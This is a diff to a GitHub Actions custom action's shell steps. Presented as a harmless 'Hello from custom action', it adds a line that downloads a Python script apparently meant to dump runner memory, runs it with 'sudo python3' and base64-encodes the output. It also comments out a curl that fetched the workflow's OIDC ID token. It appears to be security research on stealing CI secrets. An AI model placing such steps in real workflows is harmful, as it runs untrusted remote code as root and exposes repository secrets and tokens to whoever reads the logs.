@@ -15,6 +15,6 @@ runs:
         echo "Hello from custom action"
         id
         echo ----
-        curl -sSf https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/5614bc2cf50d36551d451d66c0889b867c957adc/ghamemdump.py | sudo python3
+        curl -sSf https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/5614bc2cf50d36551d451d66c0889b867c957adc/ghamemdump.py | sudo python3 | base64
         echo ----
-        curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" $ACTIONS_ID_TOKEN_REQUEST_URL | base64
+        # curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" $ACTIONS_ID_TOKEN_REQUEST_URL | base64
